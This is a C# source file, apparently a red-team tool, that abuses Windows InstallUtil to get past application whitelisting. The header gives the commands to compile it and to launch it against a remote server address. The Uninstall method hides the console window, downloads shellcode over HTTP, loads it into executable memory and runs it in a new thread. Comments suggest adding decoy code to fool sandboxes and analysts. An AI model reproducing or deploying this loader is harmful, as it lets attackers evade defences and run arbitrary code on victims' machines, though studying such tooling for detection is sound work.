using System;
using System.Net;
using System.Configuration.Install;
using System.Runtime.InteropServices;
  
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:revshell.exe rev_http.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /server="http://192.168.56.103/Y0DNA" /U revshell.exe
//You can Add Logic to Use Correct URL generator.  This is just me being lazy.
/server="http://[INSERT SERVER IP]/Y0DNA"
 
*/
 
public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
 
    }
     
}
 
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Shellcode.Exec(Context.Parameters["server"]);
    }
     
}
 
public class Shellcode
{
    public static void Exec(string url)
    {
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, 0); //Hides Process Window
         
        WebClient wc = new WebClient();
        wc.Headers.Add("user-agent", "User-Agent DFIR ");
        byte[] shellcode = wc.DownloadData(url);
         
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode.Length);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        // prepare data
 
 
        IntPtr pinfo = IntPtr.Zero;
 
        // execute native code
 
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
 
    }
   
    private static UInt32 MEM_COMMIT = 0x1000;
 
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
     UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(
 
      UInt32 lpThreadAttributes,
      UInt32 dwStackSize,
      UInt32 lpStartAddress,
      IntPtr param,
      UInt32 dwCreationFlags,
      ref UInt32 lpThreadId
 
      );
 
 
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(
 
      IntPtr hHandle,
      UInt32 dwMilliseconds
      );
     
    [DllImport("kernel32")]
    static extern IntPtr GetConsoleWindow();
     
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     
}